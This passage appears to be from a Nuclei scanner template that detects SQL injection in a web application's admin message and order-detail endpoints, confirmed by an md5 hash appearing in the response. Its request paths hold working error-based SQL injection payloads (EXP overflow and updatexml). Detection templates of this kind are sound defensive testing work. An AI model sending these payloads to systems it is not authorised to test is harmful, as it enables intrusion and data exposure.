    condition: and
    dsl:
    - status_code_1==200||status_code_2==200
    - contains(body_1,"4beed3b9c4a886067de0e3a094246f7")||contains(body_2,"4beed3b9c4a886067de0e3a094246f7")
  matchers-condition: and
  path:
  - '{{BaseURL}}/?m=message&s=admin_message_list_delbox&rid=1%20and%20EXP(~(select%20*%20from%20(select%20md5(3.14))a))'
  - '{{BaseURL}}/?m=product&s=admin/order_detail&oid=updatexml(1,concat(0x5c,md5(3.14)),1)'
  method: GET
- matchers:
  - type: dsl
    dsl:
    - status_code==200 && contains(body,"4beed3b9c4a886067de0e3a094246f7")
  matchers-condition: and
